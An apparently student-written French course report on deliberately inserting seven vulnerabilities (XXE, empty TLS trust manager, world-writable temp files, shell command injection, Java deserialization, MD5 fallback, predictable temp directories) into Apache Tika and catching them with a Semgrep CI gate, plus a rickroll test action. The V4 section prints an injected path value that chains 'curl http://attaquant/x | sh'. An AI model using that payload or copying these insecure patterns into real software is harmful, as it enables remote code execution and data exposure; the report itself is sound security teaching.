# Tâche 3 — Semgrep et intégration continue dans Tika

| Nom complet | Identifiant GitHub |
|---|---|
| Yohan Zytoon | yohanzytoon |
| Zouhair El Yani | Zouhair-36 |

| Partie | Sections |
|---|---|
| Préparation, workflow Semgrep, validation, V1–V3 | [Workflow](#workflow-et-décisions-de-conception), [V1](#v1--entités-xml-externes-cwe-611) à [V3](#v3--permissions-par-défaut-excessives-cwe-276) |
| V4–V7, comparaison des sept types, rickroll | [V4](#v4--injection-de-commande-cwe-78) à [V7](#v7--valeurs-aléatoires-prévisibles-cwe-330), [Comparaison](#comparaison-avantaprès-des-sept-types), [Rickroll](#rickroll-quand-un-test-échoue) |

| # | Type | CWE | Module | Règle Semgrep | Alertes |
|---|---|---|---|---|---|
| V1 | Entités XML externes (XXE) | CWE-611 | tika-core | `documentbuilderfactory-external-general-entities-true` | 1 |
| V2 | Validation des certificats TLS désactivée | CWE-295 | tika-core | `insecure-trust-manager` | 2 |
| V3 | Permissions de fichiers excessives | CWE-276 | tika-core | `overly-permissive-file-permission` | 1 |
| V4 | Injection de commande système | CWE-78 | tika-core | `command-injection-formatted-runtime-call` | 1 |
| V5 | Désérialisation de données non fiables | CWE-502 | tika-serialization | `object-deserialization` | 1 |
| V6 | Algorithme de hachage faible (MD5) | CWE-328 | tika-core | `use-of-md5` | 1 |
| V7 | Valeurs aléatoires prévisibles | CWE-330 | tika-parser-pdf-module | `weak-random` | 1 |

**Sept types, huit alertes** : les deux alertes de V2 concernent le même type.

## État de référence et reproductibilité

Le dépôt conserve l'historique du cas d'étude Tika. Source : commit `526f3a09dd596d5456d4dd079804aba7a57e6af5` de notre [dépôt Tâche 2](https://github.com/yohanzytoon/IFT3913-tache2-tika/commit/526f3a09dd596d5456d4dd079804aba7a57e6af5). La branche `main` contient la version finale, avec les modifications délibérément vulnérables. Le tag `tache3-clean`, SHA `98cef731437f2499dafec8d6190c2d10c88d11e4`, conserve le code sécurisé, le workflow, les règles et les trois sondes.

Environnement local vérifié : macOS arm64, OpenJDK 17.0.18, Maven 3.10.0, Python 3.11, Semgrep 1.140.0. Le fichier [requirements.txt](.semgrep/requirements.txt) fixe également les dépendances Python : la résolution initiale choisissait Pydantic 2.14.3, incompatible avec le composant MCP de cette version de Semgrep; Pydantic 2.11.9 a été testé avec succès. `pip check` ne signale aucune incompatibilité.

Les trois règles existantes sont copiées sans modification depuis le commit `a5ad1714f00c9f7fde980cab0ea1d6dc6d414fd2` de `semgrep/semgrep-rules`, avec leur licence et leurs chemins d'origine dans [.semgrep/README.md](.semgrep/README.md). Aucun motif spécifique à nos noms de classes ou commentaires n'a été inventé pour provoquer une alerte.

## Workflow et décisions de conception

Le workflow existant [main-jdk17-build.yml](.github/workflows/main-jdk17-build.yml) est modifié. Le job `security` est obligatoire et son échec rend le workflow rouge. Le job `core-tests` exécute la suite du module modifié. Le build complet hérité dépend des deux jobs et s'exécute automatiquement sur les pushes et PR lorsqu'ils réussissent. L'option manuelle `full_build`, activée par défaut, permet de le désactiver explicitement pour une démonstration ciblée. Le build complet dépend de services externes et n'est pas assimilé aux tests de `tika-core` validés ici. Les E2E dépendent du build complet.

Les déclencheurs couvrent les PR vers `main`, les pushes sur `main`, `yohan`, `zouhair/**`, `validation/**`, ainsi qu'un lancement manuel. Il n'y a pas d'exclusion des changements de documentation qui masquerait un résultat de contrôle requis. Le checkout utilise le SHA de tête réel des PR et récupère tout l'historique.

Le script [security_gate.py](scripts/tache3/security_gate.py) choisit la référence ainsi :

- PR : ancêtre commun entre la tête et le SHA de la branche cible fourni par l'événement.
- Push ordinaire : `before`, afin d'inclure tous les commits poussés ensemble.
- Premier push de branche : ancêtre commun avec la branche par défaut, ou SHA source enregistré si cette comparaison serait vide/impossible.
- Exécution manuelle/locale : SHA fourni, sinon SHA source enregistré.

Une référence absente, non ancêtre ou égale à la tête provoque un échec explicite. Le scan exige un checkout sans modifications suivies non committées. La stratégie refuse les force-pushes sans ancêtre valide au lieu de déclarer le code sûr.

L'analyse couvre les sources Java de production des cinq modules permis : core, serialization, OCR, PDF et Microsoft. Les sondes de test ne sont pas comptées comme vulnérabilités. Le même jeu de règles versionné et le même moteur servent aux scans complets et différentiels. Le jeu contient sept règles, une par type de vulnérabilité.

Le scan différentiel utilise `--baseline-commit`, `--error`, `--strict`, `--disable-nosem` et `--no-rewrite-rule-ids`. Les résultats WARNING bloquent autant que les ERROR. Code de sortie du contrôle : `0` pour absence de nouvelle alerte; `1` pour nouvelles alertes; `2` pour erreur d'outil, rapport invalide ou analyse partielle avec erreurs. Le JSON est vérifié même si le processus renvoie zéro. Aucun `continue-on-error` ni `|| true` ne transforme le contrôle en succès.

Les artefacts sont téléversés avec `if: always()`. Ils contiennent le JSON, le journal et des métadonnées : SHA avant/après, version, empreintes SHA-256 des règles, portée, commande, compte des résultats et codes de sortie. Une erreur avant le démarrage du scanner reste rouge; l'absence d'artefact n'est pas présentée comme une analyse réussie.

## V1 — entités XML externes, CWE-611

**Emplacement :** `tika-core/src/main/java/org/apache/tika/utils/XMLReaderUtils.java`, méthode publique `getDocumentBuilderFactory()`. [Commit](https://github.com/yohanzytoon/IFT3913-tache3-tika/commit/8074ea48a).

Cette fabrique constitue un point central de configuration des parseurs DOM. Initialement, elle désactive l'expansion des références et les entités externes. La modification active l'expansion, appelle `setFeature("http://xml.org/sax/features/external-general-entities", true)` et autorise le protocole `file` avec `ACCESS_EXTERNAL_DTD`.

Un document XML contrôlé par un appelant peut alors référencer un fichier local par une entité externe; le contenu apparaît dans le DOM construit directement depuis cette fabrique. La sonde crée uniquement un fichier temporaire contenant `TACHE3_LOCAL_MARKER` : le DOM sécurisé ne contient pas ce marqueur, tandis que le DOM modifié le contient.

**Limite importante :** `getDocumentBuilder()` ajoute encore un résolveur qui ignore les entités. Nous ne prétendons pas que tous les chemins Tika deviennent vulnérables. La preuve concerne précisément la fabrique publique utilisée sans ce résolveur. Les limites d'expansion restent en place et le protocole autorisé est `file`, pas l'ensemble des protocoles réseau.

**Semgrep :** règle `documentbuilderfactory-external-general-entities-true`, une nouvelle alerte à la ligne 266 dans la version analysée. **Correction :** rétablir la configuration de la référence (`setExpandEntityReferences(false)`, entités générales désactivées, aucune autorisation de DTD externes).

## V2 — validation des certificats TLS désactivée, CWE-295

**Emplacement :** `tika-core/src/main/java/org/apache/tika/io/TikaInputStream.java`, méthode `get(URL, Metadata)`. [Commit](https://github.com/yohanzytoon/IFT3913-tache3-tika/commit/0031d817b).

Cette méthode charge réellement les documents fournis par URL. Le code original utilise la validation HTTPS du JDK. La modification installe sur la connexion un `SSLContext` avec un `X509TrustManager` dont les méthodes `checkClientTrusted` et `checkServerTrusted` sont vides. Le gestionnaire est utilisé, et non simplement déclaré dans du code mort.

La sonde génère une clé/certificat éphémère avec `keytool`, lance un serveur HTTPS lié exclusivement à `127.0.0.1`, et lit un marqueur inoffensif. Le certificat n'appartient à aucune autorité de confiance mais possède le bon nom d'hôte : la référence rejette la connexion, la version vulnérable accepte le document. La vérification du nom d'hôte n'est pas supprimée; l'attaque contourne la confiance dans la chaîne de certification et permet une interception avec un certificat non fiable correspondant au nom attendu.

**Semgrep :** règle `insecure-trust-manager`, deux nouvelles alertes aux lignes 228–230 et 232–234. Elles représentent **un seul type de vulnérabilité**, pas deux. **Correction :** supprimer le gestionnaire permissif et utiliser le magasin de confiance du JDK ou un magasin explicitement administré.

## V3 — permissions par défaut excessives, CWE-276

**Emplacement :** `tika-core/src/main/java/org/apache/tika/io/TemporaryResources.java`, méthode `createTempFile(String)`. [Commit](https://github.com/yohanzytoon/IFT3913-tache3-tika/commit/f2de58f8d).

Cette classe gère les fichiers temporaires contenant les documents extraits. Après la création normale du fichier, la modification applique `rw-rw-rw-` sur un système POSIX. Elle accorde la lecture et l'écriture au groupe et aux autres utilisateurs, alors que le fichier temporaire de référence est réservé au propriétaire dans l'environnement testé.

La sonde écrit un document synthétique, lit les permissions effectives et vérifie `OTHERS_READ` et `OTHERS_WRITE`. Ces permissions sont absentes avant et présentes après. La suppression normale à la fermeture fonctionne toujours : elle ne supprime pas le risque d'accès pendant la durée de vie du fichier. L'accès effectif dépend aussi des permissions des répertoires parents; la sonde prouve les bits de permission, sans prétendre avoir exécuté un processus sous un autre compte.

**Semgrep :** règle `overly-permissive-file-permission`, une nouvelle alerte à la ligne 94. La règle utilise CWE-276; CWE-732 est une catégorie plus générale apparentée, et n'est pas comptée comme un quatrième type. **Correction :** supprimer l'élargissement des permissions ou limiter explicitement le fichier à `rw-------`. Le comportement introduit est limité aux systèmes POSIX; Windows reste inchangé.

## V4 — injection de commande, CWE-78

**Emplacement :** `tika-core/src/main/java/org/apache/tika/utils/ProcessUtils.java`, méthode publique `checkCommand(String[], int...)`. [Commit](https://github.com/yohanzytoon/IFT3913-tache3-tika/commit/b2d98a191).

**Pourquoi ce fichier :** cette méthode est le point central qui vérifie si un outil externe est installé. Elle est appelée par `FileCommandDetector.checkHasFile` (chemin de la commande `file`), par `ExternalParser` (commandes de vérification lues dans la configuration des parseurs externes) et par `TesseractOCRParser` (chemin de Tesseract, module OCR). Les chemins passés proviennent donc de la configuration ou de l'appelant de l'API.

**Modification :** le code d'origine appelle `Runtime.exec(String[])` : chaque élément du tableau est un argument distinct et aucun shell n'interprète la commande. La version modifiée joint les éléments avec des espaces et exécute le résultat avec `sh -c`. Les métacaractères du shell (`;`, `|`, `$(...)`, `` ` ``) contenus dans un élément sont alors interprétés.

**Entrée contrôlable et impact :** un chemin configuré comme `/usr/bin/file; curl http://attaquant/x | sh` exécute la seconde commande avec les droits du processus Tika. Le code devient aussi fragile pour des chemins légitimes contenant des espaces.

**Semgrep :** règle `command-injection-formatted-runtime-call` (sévérité ERROR), une nouvelle alerte à la ligne 258. **Limite observée de la règle :** son motif reconnaît l'appel `java.lang.Runtime.getRuntime(...)`. Avec Semgrep 1.140.0, nos essais sur un fichier isolé montrent que la forme courte `Runtime.getRuntime()` (importée implicitement depuis `java.lang`) n'était pas détectée, alors que la forme qualifiée l'est dans cinq variantes. Nous écrivons donc le nom qualifié, ce qui est strictement équivalent en Java; nous le signalons pour ne pas laisser croire que la règle détecte toutes les formes d'écriture.

**Correction :** revenir à `Runtime.exec(checkCmd)` ou à `ProcessBuilder` avec une liste d'arguments, sans passer par un shell.

## V5 — désérialisation de données non fiables, CWE-502

**Emplacement :** `tika-serialization/src/main/java/org/apache/tika/serialization/JsonMetadata.java`, nouvelle méthode publique `fromStream(InputStream)`, à côté de `fromJson(Reader)`. [Commit](https://github.com/yohanzytoon/IFT3913-tache3-tika/commit/4e245eefb).

**Pourquoi ce fichier :** `tika-serialization` sert à échanger les métadonnées entre processus et clients. Ajouter une « compatibilité » avec les métadonnées écrites par sérialisation Java est une évolution plausible, mais dangereuse.

**Modification :** si les deux premiers octets du flux sont `0xAC 0xED` (signature de la sérialisation Java), le flux est lu par `new ObjectInputStream(in).readObject()` puis converti en `Metadata`. Sinon, il est lu comme du JSON, comme avant.

**Entrée contrôlable et impact :** tout flux fourni à la méthode. `readObject()` reconstruit n'importe quelle classe sérialisable du classpath **avant** la conversion en `Metadata` : une chaîne de gadgets peut s'exécuter pendant la désérialisation, et un graphe d'objets construit pour être coûteux peut provoquer un déni de service, même si la conversion échoue ensuite. Aucun filtre `ObjectInputFilter` ne limite les classes acceptées. **Limite :** aucun code existant de Tika n'appelle encore cette méthode; l'exposition dépend des appelants qui l'utilisent pour lire des données externes.

**Semgrep :** règle `object-deserialization`, une nouvelle alerte à la ligne 149. **Correction :** supprimer la branche binaire et n'accepter que le JSON. Si la compatibilité est indispensable, imposer un `ObjectInputFilter` qui n'accepte qu'une liste explicite de classes.

## V6 — algorithme de hachage faible, CWE-328

**Emplacement :** `tika-core/src/main/java/org/apache/tika/digest/InputStreamDigester.java`, méthode `newMessageDigest()`. [Commit](https://github.com/yohanzytoon/IFT3913-tache3-tika/commit/0faab536b).

**Pourquoi ce fichier :** cette classe calcule les empreintes que les utilisateurs configurent (par exemple SHA-256) pour vérifier l'intégrité des documents ou les dédupliquer.

**Modification :** le code d'origine échoue (`IllegalArgumentException`) si l'algorithme configuré n'est pas disponible. La version modifiée se rabat silencieusement sur MD5. L'empreinte reste pourtant enregistrée sous la clé de l'algorithme demandé (par exemple `tk:digest:SHA3_256`).

**Configuration dangereuse et impact :** un algorithme absent de la JVM ou du fournisseur, ou mal orthographié, déclenche le repli. Les consommateurs croient disposer d'une empreinte forte, alors que les collisions MD5 sont réalisables en pratique : deux documents différents peuvent partager la même « empreinte » et contourner une déduplication ou un contrôle d'intégrité. MD5 reste disponible quand on le demande explicitement dans la configuration; la vulnérabilité est le remplacement silencieux.

**Semgrep :** règle `use-of-md5`, une nouvelle alerte à la ligne 77. **Correction :** rétablir l'exception, pour refuser plutôt que dégrader en silence.

## V7 — valeurs aléatoires prévisibles, CWE-330

**Emplacement :** `tika-parsers/.../tika-parser-pdf-module/src/main/java/org/apache/tika/renderer/pdf/poppler/PopplerRenderer.java`, méthode `renderRequest(...)`. [Commit](https://github.com/yohanzytoon/IFT3913-tache3-tika/commit/7fab72faf).

**Pourquoi ce fichier :** ce moteur de rendu demande à `pdftoppm` d'écrire les images des pages d'un PDF dans un répertoire temporaire, puis Tika relit ces images. Le nom de ce répertoire protège donc le contenu du document.

**Modification :** le code d'origine utilise `Files.createTempDirectory("tika-render-")`, qui génère un nom imprévisible et crée le répertoire de façon atomique (accès réservé au propriétaire sur POSIX). La version modifiée construit le nom avec `new Random().nextInt()` dans `java.io.tmpdir`, puis appelle `Files.createDirectories`, qui réussit aussi si le répertoire existe déjà.

**Entrée contrôlable et impact :** `java.util.Random` est un générateur congruentiel linéaire, et la sortie ne compte que 32 bits : le nom est prévisible ou devinable. Sur un `/tmp` partagé, un utilisateur local peut créer d'avance les répertoires candidats (ou des liens symboliques vers son propre répertoire). `pdftoppm` y écrit alors le rendu d'un PDF confidentiel, que l'attaquant peut lire ou remplacer avant que Tika ne relise les images. Le répertoire créé suit aussi le `umask` par défaut au lieu d'être privé.

**Semgrep :** règle `weak-random`, une nouvelle alerte à la ligne 145. **Correction :** revenir à `Files.createTempDirectory`, ou utiliser `TemporaryResources`.

## Comparaison avant/après des sept types

Les deux analyses utilisent **exactement** le même moteur (Semgrep 1.140.0), les mêmes sept fichiers de règles (dossier [`.semgrep/rules`](.semgrep/rules) de la version finale) et la même portée : les sources Java de production des cinq modules autorisés. « Avant » correspond au tag `tache3-clean`, « après » à la version finale.

| Règle | Type | Avant | Après |
|---|---|---|---|
| `documentbuilderfactory-external-general-entities-true` | CWE-611 | 0 | 1 |
| `insecure-trust-manager` | CWE-295 | 0 | 2 |
| `overly-permissive-file-permission` | CWE-276 | 0 | 1 |
| `command-injection-formatted-runtime-call` | CWE-78 | 0 | 1 |
| `object-deserialization` | CWE-502 | 0 | 1 |
| `use-of-md5` | CWE-328 | 0 | 1 |
| `weak-random` | CWE-330 | 0 | 1 |
| **Total** | | **0 alerte, 0 type** | **8 alertes, 7 types** |

Dans les deux cas : 682 fichiers analysés, 0 erreur. Les huit alertes sont toutes nouvelles, puisque la version avant n'en contient aucune.

Commande utilisée, identique pour les deux versions (exécutée localement sur Windows 11, Python 3.11) :

```sh
semgrep scan --config .semgrep/rules --metrics off --disable-nosem --json \
  tika-core/src/main/java tika-serialization/src/main/java \
  tika-parsers/tika-parsers-standard/tika-parsers-standard-modules/{tika-parser-ocr-module,tika-parser-pdf-module,tika-parser-microsoft-module}/src/main/java
```

Toutes les nouvelles vulnérabilités compilent : `tika-core`, `tika-serialization` et `tika-parser-pdf-module` ont été construits avec Checkstyle (`mvnw install -DskipTests`).

## Rickroll quand un test échoue

**Action réutilisable :** [`.github/actions/rickroll`](.github/actions/rickroll/action.yml), une action composite appelée avec `uses: ./.github/actions/rickroll`. Elle a deux paramètres facultatifs (`reports-glob`, `video-url`) et deux sorties (`rickrolled`, `failed-tests`), ce qui permet de la réutiliser dans n'importe quel job Maven.

**Déclenchement :** dans le job `core-tests`, l'étape suit `Core tests` (`id: tests`) avec la condition `failure() && steps.tests.outcome == 'failure'`. Elle ne s'exécute donc que si l'étape des tests elle-même a échoué.

**Vrai échec de test seulement :** le script [`rickroll.py`](.github/actions/rickroll/rickroll.py) lit les rapports Surefire `TEST-*.xml` et compte les cas de test qui contiennent `<failure>` ou `<error>`. Si aucun n'est trouvé (erreur de compilation, dépendance manquante, aucun rapport), il n'y a pas de rickroll. Sinon, il affiche le rickroll dans le journal, une annotation d'erreur et un résumé de l'exécution avec le lien vers la vidéo et la liste des tests en échec.

**Le job reste rouge :** l'action se termine toujours avec le code 0, et le job est rouge parce que l'étape `tests` a échoué. Le rickroll ne remplace ni ne masque cet échec.

**Validation :**
- Localement, sur trois jeux de rapports : test en échec ou en erreur (rickroll, `failed-tests=2`), tests réussis ou ignorés (pas de rickroll), aucun rapport (pas de rickroll).
- Sur GitHub, branche [`validation/rickroll`](https://github.com/yohanzytoon/IFT3913-tache3-tika/tree/validation/rickroll), créée depuis `tache3-clean` pour que le contrôle de sécurité ne bloque pas la démonstration. Le commit [`bf6405d65`](https://github.com/yohanzytoon/IFT3913-tache3-tika/commit/bf6405d65) ajoute un test JUnit qui échoue volontairement (`RickrollDemoTest`) : [exécution rouge avec rickroll](LIEN_RUN_ROUGE). Ce test est ensuite retiré : [exécution verte](LIEN_RUN_VERT).

## Validation locale obtenue

| Vérification | Résultat observé |
|---|---|
| Suite core sur la source sécurisée | 752 tests, 0 échec, 0 erreur, 2 ignorés |
| Trois sondes sur la référence sécurisée | 3 tests, 0 échec, 0 erreur |
| Suite core avec les trois sondes, version vulnérable | 755 tests, 0 échec, 0 erreur, 2 ignorés; Checkstyle validé |
| Tests unitaires du contrôle CI | 14 réussis après revue : baseline PR, push multiple, nouvelle branche, référence invalide, rapports malformés et gestion des résultats/erreurs |
| Validation réelle du scanner après revue | 11 vérifications réussies sur fixtures Java isolées, dont déplacement, remplacement à total constant, réparation et règle invalide |
| Scan complet avant | 682 fichiers, 3 règles, 0 alerte, 0 erreur |
| Scan complet après les trois changements | 4 alertes correspondant à 3 types, 0 erreur |
| Contrôle différentiel après les trois changements | 4 nouvelles alertes, sortie 1 : échec attendu |

Les rapports avant/après, les métadonnées et les journaux originaux restent consultables dans [le commit de référence des preuves](https://github.com/yohanzytoon/IFT3913-tache3-tika/tree/8eda68ffef618754e7c48c460b2454c306a4e23f/docs-tache3/evidence). Ils ont été retirés de l'arbre courant pour garder le dépôt compact. Le rapport final avant/après des **sept** types se trouve dans la section [Comparaison avant/après des sept types](#comparaison-avantaprès-des-sept-types).

L'[exécution GitHub Actions vérifiée](https://github.com/yohanzytoon/IFT3913-tache3-tika/actions/runs/43999578020), sur `f53c27dcb`, confirme quatre nouvelles alertes et la sortie `1` attendue du contrôle, ainsi que le téléversement des artefacts. Les tests core y réussissent : 755 tests, 0 échec, 0 erreur, 5 ignorés, dont les trois sondes facultatives non activées. Le build complet et les E2E y sont ignorés. Cette exécution précède les améliorations de validation et le rétablissement du build automatique; leur réussite distante n'est pas revendiquée ici.

La revue locale confirme aussi zéro nouvelle alerte sur `main` (`abe046c26`) comparé à `tache3-clean`. Les onze vérifications sur fixtures Java couvrent : changement propre, nouvelle alerte en PR, alerte existante inchangée ou déplacée, remplacement avec total constant (deux inventaires complets), push de plusieurs commits, nouveau push de branche, réparation cumulative et règle invalide. Les fixtures valident le contrôle; elles ne représentent pas de nouvelles vulnérabilités Tika.

Un push documentaire sur une branche déjà vulnérable peut passer contre `before` : il n'ajoute aucune alerte. Pour vérifier toutes les vulnérabilités de la branche, utiliser une PR vers `main` ou la référence explicite `tache3-clean`. Une exécution GitHub verte sur la référence propre reste à lier pour compléter la preuve distante.

## Reproduire

Créer un environnement Python 3.11 et installer `python -m pip install -r .semgrep/requirements.txt`. Activer cet environnement afin que `python` et `semgrep` utilisent le même répertoire d'installation.

```sh
# Contrôle normal : 0 sur main, 1 sur la branche vulnérable.
python scripts/tache3/security_gate.py --baseline tache3-clean --output /tmp/tache3-gate

# Inventaire complet : les alertes sont enregistrées sans rendre l'inventaire rouge.
python scripts/tache3/security_gate.py --full --output /tmp/tache3-inventory

# Contrôle de la logique CI.
python -m unittest discover -s scripts/tache3 -p 'test_*.py' -v
python scripts/tache3/validate_scanner.py --output /tmp/tache3-scanner-validation

# Référence sécurisée, avec les sondes activées explicitement.
git switch --detach tache3-clean
mvn -B -pl tika-core -am -Dtest=Tache3SecurityProofTest \
  -Dsurefire.failIfNoSpecifiedTests=false -Dtache3.demo=true test

# Branche de démonstration : trois comportements vulnérables attendus.
git switch main
mvn -B -pl tika-core -am -Dtache3.demo=true -Dtache3.expectVulnerable=true test
```

Les sondes sont désactivées dans les exécutions ordinaires : elles caractérisent volontairement un comportement sûr ou vulnérable selon la révision, et ne constituent pas des assertions de sécurité à conserver telles quelles en production. Le contrôle Semgrep reste indépendant et rouge sur l'introduction des vulnérabilités, même lorsque les sondes passent.

## Références et utilisation de l'IA

- [Consignes et critères de la tâche](https://github.com/umontreal-diro/IFT3913/blob/2026/tache3/readme.md)
- [CLI Semgrep : analyse différentielle et codes de sortie](https://semgrep.dev/docs/cli-reference)
- [Sources et licence des règles](.semgrep/README.md)
- [Code des sondes](tika-core/src/test/java/org/apache/tika/security/Tache3SecurityProofTest.java)

Des assistants de programmation basés sur des modèles de langage ont servi d'assistance pour préparer le workflow, introduire les modifications pédagogiques, écrire l'action rickroll, organiser et relire cette documentation, ainsi que pour interpréter les résultats Semgrep et CI. On a vérifié les commandes, les rapports Semgrep, les compilations et les journaux GitHub Actions avant de rapporter les résultats. Les mesures et les conclusions présentées ici sont rattachées aux exécutions décrites dans ce rapport.
